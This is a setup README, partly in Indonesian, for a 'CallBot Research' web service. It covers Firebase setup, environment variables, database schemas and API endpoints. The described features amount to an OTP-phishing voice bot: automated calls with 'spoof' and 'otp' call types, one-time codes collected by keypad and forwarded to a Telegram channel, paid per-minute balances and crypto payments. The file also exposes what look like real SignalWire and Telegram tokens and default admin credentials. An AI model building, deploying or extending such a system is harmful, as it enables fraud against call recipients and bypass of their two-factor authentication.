# CallBot Research - Setup Instructions

## 🚀 Firebase Authentication Setup (REQUIRED)

Sebelum menggunakan sistem, Anda harus mengaktifkan Firebase Authentication di Firebase Console.

### Langkah-langkah:

1. **Buka Firebase Console**
   - Kunjungi: https://console.firebase.google.com
   - Pilih project: `clankk-e61f8`

2. **Aktifkan Email/Password Authentication**
   - Di sidebar kiri, klik **Build** → **Authentication**
   - Klik tab **Sign-in method**
   - Klik **Email/Password**
   - Toggle **Enable** → Save
   
3. **Buat Admin User Pertama**
   ```bash
   cd /app/backend
   python create_admin.py
   ```
   
   **Default Admin Credentials:**
   - Email: `admin@callbot.com`
   - Password: `admin123`
   - Balance: $1000 (for testing)

---

## 🔧 System Architecture

### Backend (FastAPI + Firebase)
- **Framework**: FastAPI
- **Database**: Firebase Firestore
- **Auth**: Firebase Authentication
- **Real-time**: WebSocket
- **VoIP**: SignalWire API
- **Messaging**: Telegram Bot API

### Frontend (React)
- **Framework**: React 19
- **Styling**: Tailwind CSS + Shadcn/UI
- **Auth**: Firebase JS SDK
- **State**: Context API
- **Real-time**: WebSocket Client

---

## 📦 Environment Variables

### Backend (.env)
```env
FIREBASE_PROJECT_ID=clankk-e61f8

# SignalWire
SIGNALWIRE_PROJECT_ID=lanjutkan-ini
SIGNALWIRE_SPACE_URL=marauang-rauang.signalwire.com
SIGNALWIRE_TOKEN=PTf3a107d98daf47a94fee499d736507ec38b7281a3a375b66

# Telegram
TELEGRAM_BOT_TOKEN=8179370597:AAHPl3T3lixwxukN0Y0_wcrgVXZRjB19wOQ
TELEGRAM_CHANNEL_ID=-1003442553402

# App Config
JWT_SECRET=your-secret-key-change-in-production
CALL_COST_PER_MINUTE=0.5
```

### Frontend (.env)
```env
REACT_APP_BACKEND_URL=https://lanjutkan-ini.preview.emergentagent.com
```

---

## 🎯 Features Implemented

### ✅ Authentication System
- Firebase Authentication integration
- Role-based access control (Admin / User)
- JWT token validation
- Device restriction (1 device per user)

### ✅ User Management (Admin Only)
- Create new users
- Delete users
- Update user balance
- View all users

### ✅ Call Management
- Initiate voice calls via SignalWire
- Configure TTS messages
- OTP gathering via DTMF
- Real-time call event logging
- Call recording

### ✅ Real-time Features
- WebSocket connection for live call events
- Live event logs display
- Instant balance updates
- Call status updates

### ✅ Telegram Integration
- OTP forwarding to Telegram channel
- Call notifications
- Event logging

### ✅ Payment System (Mock)
- USDT TRC20 payment (mock)
- Bank transfer payment (mock)
- Admin payment verification
- Automatic balance update

### ✅ UI/UX
- Dark theme with neon cyan accents
- Terminal-style logs
- Glass-morphism effects
- Responsive design
- Modern components (Shadcn/UI)

---

## 🗄️ Firestore Collections

### `users`
```javascript
{
  uid: string,
  email: string,
  username: string,
  role: "admin" | "user",
  balance: number,
  device_id: string | null,
  telegram_id: string | null,
  created_at: string (ISO)
}
```

### `calls`
```javascript
{
  call_id: string,
  user_id: string,
  from_number: string,
  to_number: string,
  service_name: string,
  call_type: "otp" | "custom" | "spoof",
  status: string,
  events: Array<{
    time: string,
    event: string,
    data: object
  }>,
  recording_url: string | null,
  created_at: string (ISO)
}
```

### `signalwire_numbers`
```javascript
{
  phone_number: string,
  assigned_to_user_id: string | null,
  is_active: boolean,
  created_at: timestamp
}
```

### `payments`
```javascript
{
  payment_id: string,
  user_id: string,
  amount: number,
  method: "usdt" | "bank_transfer",
  status: "pending" | "completed" | "failed",
  transaction_hash: string | null,
  qr_code_url: string | null,
  bank_details: object | null,
  created_at: string (ISO)
}
```

---

## 🔗 API Endpoints

### Authentication
- `POST /api/auth/register` - Create user (Admin only)
- `POST /api/auth/login` - Login
- `GET /api/auth/verify` - Verify token

### Users
- `GET /api/users/profile` - Get profile
- `POST /api/users/change-password` - Change password
- `POST /api/users/link-telegram` - Link Telegram
- `GET /api/users/all` - Get all users (Admin)
- `PUT /api/users/{uid}/balance` - Update balance (Admin)
- `DELETE /api/users/{uid}` - Delete user (Admin)

### Calls
- `POST /api/calls/start` - Start call
- `GET /api/calls/history` - Get call history
- `GET /api/calls/{call_id}` - Get call details
- `POST /api/calls/{call_id}/control` - Control call

### Webhooks
- `POST /api/webhooks/signalwire/{call_id}` - SignalWire callback
- `POST /api/webhooks/signalwire/{call_id}/gather` - DTMF gathering
- `POST /api/webhooks/signalwire/{call_id}/status` - Status updates

### Admin
- `POST /api/admin/signalwire/numbers` - Add number
- `GET /api/admin/signalwire/numbers` - Get numbers
- `DELETE /api/admin/signalwire/numbers/{id}` - Delete number
- `PUT /api/admin/signalwire/credentials` - Update credentials
- `GET /api/admin/signalwire/credentials` - Get credentials

### Payments
- `POST /api/payments/initiate` - Initiate payment
- `GET /api/payments/history` - Get payment history
- `POST /api/payments/{payment_id}/verify` - Verify payment (Admin)

### WebSocket
- `WS /ws/calls/{user_id}` - Real-time call events

---

## 🧪 Testing

### Backend API Test
```bash
curl https://lanjutkan-ini.preview.emergentagent.com/api/health
```

### Login Test (After Firebase Auth is enabled)
```bash
curl -X POST https://lanjutkan-ini.preview.emergentagent.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@callbot.com","password":"admin123"}'
```

---

## 📝 Usage Flow

1. **Admin Login** → Create users with initial balance
2. **User Login** → View balance and call history
3. **Make Call** → Configure call parameters
4. **Monitor** → Watch real-time call events in logs
5. **Receive OTP** → OTP forwarded to Telegram channel
6. **Control Call** → Accept/Reject via control buttons
7. **View History** → Check call logs and recordings

---

## ⚠️ Important Notes

1. **Firebase Authentication MUST be enabled** before first use
2. Payment system is **MOCK** for research purposes
3. SignalWire credentials are configured but need valid numbers
4. Telegram bot is configured and ready
5. All sensitive data stored in `.env` files
6. Device restriction enforces 1 device per user
7. Admin has full access, users have limited access

---

## 🆘 Troubleshooting

### Backend not starting
```bash
# Check logs
tail -n 100 /var/log/supervisor/backend.err.log

# Restart backend
sudo supervisorctl restart backend
```

### Frontend not loading
```bash
# Check logs
tail -n 100 /var/log/supervisor/frontend.err.log

# Restart frontend
sudo supervisorctl restart frontend
```

### Firebase Connection Error
- Verify `firebase_config.json` exists in `/app/backend/config/`
- Check service account has correct permissions
- Ensure Firestore database is created

### WebSocket Connection Failed
- Check if backend is running on port 8001
- Verify WebSocket URL in frontend matches backend URL
- Check CORS settings in backend

---

## 📞 Support

Untuk pertanyaan atau issue, silakan check:
- Backend logs: `/var/log/supervisor/backend.*.log`
- Frontend logs: `/var/log/supervisor/frontend.*.log`
- Browser console untuk frontend errors

---

**Built with ❤️ for Research Purposes**
